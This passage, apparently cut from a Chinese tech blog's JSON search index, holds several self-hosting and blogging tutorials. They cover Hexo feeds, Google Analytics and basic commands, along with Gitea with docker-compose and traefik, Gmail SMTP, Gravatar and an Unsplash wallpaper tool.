\u0026lt;%_ for (const post of posts) { _%\u0026gt; \u0026lt;entry\u0026gt; \u0026lt;id\u0026gt;\u0026lt;%= post.permalink %\u0026gt;\u0026lt;/id\u0026gt; \u0026lt;title\u0026gt;\u0026lt;%= post.title %\u0026gt;\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;alternate\u0026#34; href=\u0026#34;\u0026lt;%= post.permalink %\u0026gt;\u0026#34;/\u0026gt; \u0026lt;content type=\u0026#34;html\u0026#34;\u0026gt;\u0026lt;%= post.content %\u0026gt;\u0026lt;/content\u0026gt; \u0026lt;%_ for (const { name } of (post.tags ? post.tags.toArray() : [])) { _%\u0026gt; \u0026lt;category term=\u0026#34;\u0026lt;%= name %\u0026gt;\u0026#34; /\u0026gt; \u0026lt;%_ } _%\u0026gt; \u0026lt;updated\u0026gt;\u0026lt;%= moment(post.date).toISOString() %\u0026gt;\u0026lt;/updated\u0026gt; \u0026lt;/entry\u0026gt; \u0026lt;%_ } _%\u0026gt; \u0026lt;/feed\u0026gt; Json Feed: themes/layout/template/json.ejs\n\u0026lt;/\u0026gt; html 📄 json.ejs 1 2 3 4 5 6 7 8 9 10 11 12 13 14 \u0026lt;%- JSON.stringify({ version: \u0026#39;https://jsonfeed.org/version/1\u0026#39;, title: config.title + (tag ? ` • All posts by \u0026#34;${tag}\u0026#34; tag` : \u0026#39;\u0026#39;) + (category ? ` • All posts by \u0026#34;${category}\u0026#34; category` : \u0026#39;\u0026#39;), description: config.description, home_page_url: config.url, items: posts.map(post =\u0026gt; ({ id: post.permalink, url: post.permalink, title: post.title, date_published: moment(post.date).toISOString(), content_html: post.content || \u0026#39;\u0026#39;, tags: (post.tags ? post.tags.toArray() : []).map(({ name }) =\u0026gt; name) })) }, null, 4) _%\u0026gt; 設定 修改 Heox 設定檔 _config.yml 新增 feed 設定\n\u0026lt;/\u0026gt; yaml 📄 _config.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 feed: limit: 20 order_by: \u0026#34;-date\u0026#34; tag_dir: \u0026#34;tag\u0026#34; category_dir: \u0026#34;category\u0026#34; rss: enable: true template: \u0026#34;themes/layout/template/rss.ejs\u0026#34; output: \u0026#34;rss.xml\u0026#34; atom: enable: true template: \u0026#34;themes/layout/template/atom.ejs\u0026#34; output: \u0026#34;atom.xml\u0026#34; jsonFeed: enable: true template: \u0026#34;themes/layout/template/json.ejs\u0026#34; output: \u0026#34;feed.json\u0026#34; 詳細設定參考 GitHub\n完成 接下來只要重新佈署 hexo 即可\n\u003e_ terminal 1 hexo server 檢查這些網址看是否安裝成功\nhttp://localhost:4000/rss.xml\nhttp://localhost:4000/atom.xml\nhttp://localhost:4000/feed.json\nPhoto by Mediamodifier on Unsplash\n","date":"2021-12-09T13:48:27+08:00","image":"https://zonego.tw/post/hexo-rss/mail_hu_d625657dc8dc748c.jpg","permalink":"https://zonego.tw/post/hexo-rss/","title":"增加 Hexo 的 RSS, ATOM, JSON Feed 訂閱功能"},{"content":"自動換桌布的方案有很多\n在 Windows 上比較有名的是 Wallpaper Engine，除了一般的圖片之外，還可以將影片、靜態網頁做成桌布\n跨平台的方案則有微軟的 bing wallpaper\nUnsplash Unsplash 是一個免費的相片共享網站\n攝影師可以將相片上傳到 Unsplash，相片編輯者們會對使用者上傳的相片進行整理\nUnsplash 使用了較為自由的著作權許可條款，這讓 Unsplash 上的相片經常在文章配圖中出現\n想當然，官方也推出像 bing wallpaper 一樣的自動桌布工具在這裡\n但只有 iOS MAC AppleTV 以及 chrome 能使用\n但PC平台這種大神開發者的發源地，這種小問題已經有人解決了\nunsplash-wallpapers 這次要介紹的就是基於Unsplash圖庫的開源小工具 unsplash-wallpapers\nGithub\n特點 支援 Windows MAC Linux 系統 紀錄更換過的歷史桌布. 可設定自動更換週期，每小時、每天、每周、手動 下載桌布原圖 範例 下載 下載點請到 Github Release\n依據你的系統下載定應安裝檔\nMAC 系統下載 .dmg\nWindows 下載 .exe\nRedhat、Centos 下載 .rpm\ndebain、Ubuntu 下載 .deb\n要自行編譯就下載 Sorce code\n裝完就可以享受定時自動換桌布啦🎉\n","date":"2021-12-06T19:05:56+08:00","image":"https://zonego.tw/post/unsplash-wallpapers/unsplash_hu_42d84e85fbc0f396.png","permalink":"https://zonego.tw/post/unsplash-wallpapers/","title":"自動換桌布 unsplash-wallpapers"},{"content":"作為寫過程式的人，Git是必備工具 除非只是寫好玩的\n常見的線上Git儲藏庫就是 GitHub、Gitlab、Bitbucket\n如果對於這些公開平台不放心，或是程式碼不想外流，那就自己架私服吧!\n常見的有 Gitea、gogs或是Gitlab\nGitlab裡面包含 CI/CD 工具等功能，十分肥大\n想要一個安裝簡單、有完整git功能又有中文介面，那就選 Gitea 吧！\n安裝 說明文件\nGitea 提供很多安裝方式，我這邊選則用 docker 手邊有現成的docker伺服器，不用白不用\ndocker-compose 安裝說明\n選擇版本 Gitea 的官方映像可以在 Docker Hub 找到\n版本 tag 與 Gitea 的 Github 上發布的版本號一樣\nlatest 則是最新的穩定版\n選擇資料庫 Gitea 支援多種資料庫，例如 mysql mariadb PostgreSQL\n安裝過程 使用 docker-compose 安裝\n我這邊選用 mysql 資料庫\n\u0026lt;/\u0026gt; yaml 📄 docker-compose.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 version: \u0026#34;2\u0026#34; services: server: image: gitea/gitea:1.15.6-rootless environment: - GITEA__database__DB_TYPE=mysql - GITEA__database__HOST=db:3306 - GITEA__database__NAME=gitea - GITEA__database__USER=gitea - GITEA__database__PASSWD=gitea restart: always volumes: - ./data:/var/lib/gitea - ./config:/etc/gitea - /etc/timezone:/etc/timezone:ro - /etc/localtime:/etc/localtime:ro ports: - \u0026#34;10080:3000\u0026#34; - \u0026#34;10022:22\u0026#34; depends_on: - db db: image: mysql:8 restart: always environment: - MYSQL_ROOT_PASSWORD=gitea - MYSQL_USER=gitea - MYSQL_PASSWORD=gitea - MYSQL_DATABASE=gitea volumes: - ./mysql:/var/lib/mysql 執行\n\u003e_ terminal 1 docker-compose up 完成後可以用 http://hostname:10080 連到你剛剛架的 gitea\nSSH 要使用 10022 例如\n\u003e_ terminal 1 git clone ssh://git@hostname:10022/username/repo.git 如果想用預設 Port\n\u0026lt;/\u0026gt; yaml 1 2 3 4 5 6 7 8 9 #將這段 ports: - \u0026#34;10080:3000\u0026#34; - \u0026#34;10022:22\u0026#34; #換成這段 ports: - \u0026#34;80:3000\u0026#34; - \u0026#34;22:22\u0026#34; 到這邊自己用應該夠了，後續如果要在外網使用，建議還是設定網段 + SSl憑證 (弄成https) 會比較安全\n設定 revers proxy 我自己是使用 traefik 做 revers proxy\n由於之前是用 haproxy ，改用 traefik 之後還是習慣用檔案手動設定\n後面的範例會以設定檔的方式為主，也可以參考官方文件改成 docker labels\nhttps 我的 traefik 有設定監看資料夾的動態設定檔，service 跟 router 分別在不同檔案\n如果沒有用動態設定檔的話，設定應該都在 traefik.toml 只不過改完後要重開\n啟用動態設定檔 directory 可以自行更換\n\u0026lt;/\u0026gt; toml 📄 traefik.toml 1 2 3 4 [providers] [providers.file] directory = \u0026#34;/etc/traefik/dynamic_configs\u0026#34; watch = true 設定 let\u0026rsquo;s encrypt 自動申請憑證 驗證方式有幾種可以選，一般常用的是 http Challenge\n我的網站有套用 cloudflare 保護，DNS 代理就轉過去 cloudflare 了\n外加 cloudflare 有支援 dns Challenge，乾脆就用這種 DNS 驗證比較省事\n如果你的網域租賃商有提供 dns Challenge，也可以用這種方式驗證比較簡單\n只要設定一次，可以套用多個網域\nresolvers 可以改成你的網域租賃商，我這邊寫的是 cloudflare 的 DNS\n如果要套用 cloudflare 的防護，這邊不用改\n\u0026lt;/\u0026gt; toml 📄 traefik.toml 1 2 3 4 5 6 7 8 [certificatesResolvers.cloudflare-resolver.acme] email = \u0026#34;youremail@gmail.com\u0026#34; storage = \u0026#34;/etc/traefik/acme.json\u0026#34; [certificatesResolvers.cloudflare-resolver.acme.dnsChallenge] provider = \u0026#34;cloudflare\u0026#34; delayBeforeCheck = 0 resolvers = [\u0026#34;1.1.1.1:53\u0026#34;, \u0026#34;1.0.0.1:53\u0026#34;] 設定 entry point \u0026lt;/\u0026gt; toml 📄 traefik.toml 1 2 3 4 5 6 7 8 9 10 11 [entryPoints] [entryPoints.ssh] address = \u0026#34;:22\u0026#34; [entryPoints.web] address = \u0026#34;:80\u0026#34; [entryPoints.websecure] address = \u0026#34;:443\u0026#34; [entryPoints.websecure.http.tls] certResolver = \u0026#34;cloudflare-resolver\u0026#34; 添加後端跟路由 添加 http service\n\u0026lt;/\u0026gt; toml 📄 /etc/traefik/dynamic_configs/service.toml 1 2 3 4 5 6 7 8 9 10 [http.services] [http.services.gitea.loadBalancer] # healthCheck 是讓 traefik 檢查 gitea 伺服器是否還活著，不要可以去掉 [http.services.gitea.loadBalancer.healthCheck] scheme = \u0026#34;http\u0026#34; path = \u0026#34;/\u0026#34; interval = \u0026#34;10s\u0026#34; timeout = \u0026#34;3s\u0026#34; [[http.services.gitea.loadBalancer.servers]] url = \u0026#34;http://gitea-ip:3000\u0026#34; 再來是添加 router\n\u0026lt;/\u0026gt; toml 📄 /etc/traefik/dynamic_configs/routre.toml 1 2 3 4 5 6 7 [http.routers] [http.routers.git] entryPoints = [\u0026#34;websecure\u0026#34;] rule = \u0026#34;Host(`git.your.domain`)\u0026#34; service = \u0026#34;gitea\u0026#34; [http.routers.git.tls] certResolver = \u0026#34;cloudflare-resolver\u0026#34; 這樣就完成了\nssh git 使用 key 做身分認證時必須要走 ssh 的協定，如果要使用就必須做好轉發\n在 revers proxy 設定連接 就直接轉到 gitea 伺服器\n","date":"2021-11-25T19:22:30+08:00","image":"https://zonego.tw/post/gitea/Gitea_hu_44f255f2513ebc84.jpg","permalink":"https://zonego.tw/post/gitea/","title":"Gitea - 自己的 Git 自己架"},{"content":"辦完帳號設定大頭貼是使用大多數服務的必經之路，今天就是要來解決需要重複上傳大頭貼的問題! (希望可以\u0026hellip;)\nGravatar Gravatar 是多個網站支援的大頭貼服務，Slack、GitHub、WordPress 等大型網站都有支援。\n只需在這邊設定完大頭貼，就可以一次套用\n除了提供大頭貼，Gravatar 也提供類似線上名片的功能\n你可以在上面放你的網站、email等公開資訊，不過我很少用\n使用大頭貼 參考官方文件的使用方法\n裡面有個方便的用法：取得大頭貼的大頭貼的URL\n有URL後在，大多數網頁或是可串接網路圖片的地方都可以嵌入\n如果不能用，一定是你還沒上傳大頭貼\n大頭貼的網址長這樣，HASH的部分要替換成email的md5 hash值\n1 https://www.gravatar.com/avatar/HASH 如果不知道怎麼找對應的hash值，可以在 http://www.md5.cz/ 產生對應的產生對應的 md5 hash\n例如我email的hash值找到是 0b1d2b9d95375cc6af5909e145fb4a06\n我的大頭貼網址就是\n1 https://www.gravatar.com/avatar/0b1d2b9d95375cc6af5909e145fb4a06 \u0026lt;/\u0026gt; markdown 1 ![大頭貼](https://www.gravatar.com/avatar/0b1d2b9d95375cc6af5909e145fb4a06) 當初為了這篇文章的分類該分在那想了很久，既然是免費用別人的服務，就還是歸類在免費資源吧\n","date":"2021-11-22T16:30:59+08:00","image":"https://zonego.tw/post/gravatar/gravatar_hu_5a6c2ee5d9827e5f.jpg","permalink":"https://zonego.tw/post/gravatar/","title":"Gravatar 你的免費大頭貼、個人檔案和個人主頁連結"},{"content":"Google Analytics（GA）是Google公司提供的數據分析工具，可以幫助你追蹤你的網站流量、用戶行為，是一個網路行銷重要又好用的小工具。\n網路上會看到很多推薦使用 GA 的文章，有甚麼功能就不用我多說了 絕對不是我想偷懶。\n畢竟我這小小的部落格也就只有看人數的需求而已。\n申請 Google Analytics 基本上你有 google 帳號就完成一半了，接下來到 Google Analytics網站\n接著在左下角管理 \u0026gt; 建立資源 \u0026gt; 完成後到資料串流\n新增網站串流，裡面填入要分析的網站網址，以及名稱\n完成後我們會得到需要的 評估ID G-XXXXX 的這串ID\n修改Hexo設定檔 3.0 版設定方式 nexmoe 這個主題有支援 Google Analytics\n只要在 _config.nexmoe.yml 設定檔內調整分析的設定即可\n\u0026lt;/\u0026gt; yaml 1 2 3 4 5 6 7 8 analytics: google_site_id: #\u0026lt;ID\u0026gt; gtags_site_id: 這邊填入分析ID G-XXXXX cnzz_site_id: #\u0026lt;ID\u0026gt; tencent_site_id: #\u0026lt;ID\u0026gt; la_site_id: #\u0026lt;ID\u0026gt; baidu_site_id: #\u0026lt;ID\u0026gt; gtm_container_id: #\u0026lt;ID\u0026gt; 4.0 版設定方式 照前面申請 Google Analytics 的步驟，先到資料串流設定\n按一下「管理」。 使用「資源」欄頂端的下拉式選取器，選擇要在哪個資源設定資料串流的 Google 代碼。 在「資源」欄中，按一下「資料串流」。 照下圖複製 打開 _config.nexmoe.yml 設定檔內在 slotHead 下面貼上複製的嵌入碼\n\u0026lt;/\u0026gt; yaml 📄 _config.nexmoe.yml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ... slotHead: | \u0026lt;!-- Google tag (gtag.js) --\u0026gt; \u0026lt;script async src=\u0026#34;https://www.googletagmanager.com/gtag/js?id=G-ID\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag(\u0026#39;js\u0026#39;, new Date()); gtag(\u0026#39;config\u0026#39;, \u0026#39;G-ID\u0026#39;); \u0026lt;/script\u0026gt; ... 成果 設定完後重開 Hexo 伺服器套用\n在GA網站 \u0026gt; 報表內看到我們要的瀏覽人數\n網站果然沒有人看，人數是0\n其實是截圖時根本還沒重開 Hexo，所以 Google 根本沒抓到瀏覽紀錄\n","date":"2021-11-16T15:44:43+08:00","permalink":"https://zonego.tw/post/hexo-ga/","title":"Hexo nexmoe 主題套用 Google Analytics"},{"content":"建立 Gmail 應用程式密碼 Google 基於安全性，禁用直接用密碼存取 smtp\n取而代之要先建立應用程式密碼，代替原本密碼的功能\n管理 Google 帳戶 \u0026gt; 安全性 \u0026gt; 登入 Google \u0026gt; 應用程式密碼\n應用選郵件，裝置只是方便管理的名稱，可以選其他自己寫\n完成後會產生一組密碼，建議用完之後就忘掉他，下次要用忘記時再建新的就好\n設定 container 環境變數 我的 gitea 是使用 Docker 架的\ngitea 官方鏡像有提供透過環境變數設定，不用另外修改設定檔\n\u0026lt;/\u0026gt; dockerfile 1 2 3 4 5 6 7 8 environment: - GITEA__mailer__ENABLED=true - GITEA__mailer__FROM=寄件者信箱 - GITEA__mailer__MAILER_TYPE=smtp - GITEA__mailer__HOST=smtp.gmail.com:465 - GITEA__mailer__IS_TLS_ENABLED=true - GITEA__mailer__USER=你的Gmail - GITEA__mailer__PASSWD=應用程式密碼 改完之後到 Gitea 網站 \u0026gt; 網站管理 \u0026gt; 組態\n往下捲找到 SMTP 組態，可以測試寄信\n詳細參考\n","date":"2021-11-14T12:39:30+08:00","image":"https://zonego.tw/post/gitea-gmail/mail_hu_d625657dc8dc748c.jpg","permalink":"https://zonego.tw/post/gitea-gmail/","title":"Gitea 使用 Gmail 寄信"},{"content":"官網\n使用說明\nGitHub.\n常用指令 建新貼文 \u003e_ terminal 1 hexo new 文章名稱 詳細請看: Writing\n啟動測試伺服器 Hexo 提供 Web server 功能，不須透過 Nginx 或是 apache\n安裝\n\u003e_ terminal 1 npm install hexo-server --save 啟動伺服器\n\u003e_ terminal 1 hexo server 詳細請看: Server\n產生靜態網站檔案 \u003e_ terminal 1 hexo generate 詳細請看: Generating\n部署到網站伺服器 \u003e_ terminal 1 hexo deploy 產生靜態頁面後佈署\n兩個指令相同\n\u003e_ terminal 1 2 hexo generate --deploy hexo deploy --generate 詳細請看: Deployment\n增加文章分類 (Categories) 指令開啟分類功能\n\u003e_ terminal 1 hexo new page categories 新文章增加分類，只要在新貼文的標頭加上 categories\n\u0026lt;/\u0026gt; markdown 1 2 3 4 5 --- title: 2021-11-00 date: 2021-11-00 10:10 categories: 這裡寫分類 --- 增加文章標籤 (Tags) 指令開啟標籤功能\n\u003e_ terminal 1 hexo new page tags 新文章增加標籤，也是在新貼文的標頭加上 tags\n\u0026lt;/\u0026gt; markdown 1 2 3 4 5 6 7 --- title: 2021-11-00 date: 2021-11-00 10:10 tags: - 第一個標籤 - 第二個標籤 --- 修改新文章預設標頭 修改 scaffolds/post.md\n\u0026lt;/\u0026gt; marddown 1 2 3 4 title: {{ title }} date: {{ date }} categories: {{ categories }} tags: {{ tags }} 這樣每次新增文章就會自動添加分類及標籤\n","date":"2021-11-13T12:30:30+08:00","image":"https://zonego.tw/post/hexo/hexo_hu_8391813d28afa5b.jpg","permalink":"https://zonego.tw/post/hexo/","title":"Hexo 基本使用教學"}]